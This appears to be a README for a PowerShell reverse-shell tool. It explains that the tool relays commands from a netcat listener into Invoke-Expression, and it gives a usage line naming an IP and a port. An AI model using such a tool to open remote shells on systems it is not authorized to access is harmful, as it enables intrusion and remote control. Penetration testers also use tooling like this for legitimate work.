# PowerShell-Reverse-Shell
Native PowerShell reverse shell to a netcat listener.

Supports commands up to 16384 bytes in length, if you need longer than modify the line where the System.Byte[] object is declared.

This passes all commands entered from the netcat listener to PowerShell's Invoke-Expression, so this supports powershell + cmd.exe commands. Errors are sent over the socket

# Usage:
./pwsh_revshell.ps1 
pwsh_revshell -ip 127.0.0.1 -port 3333
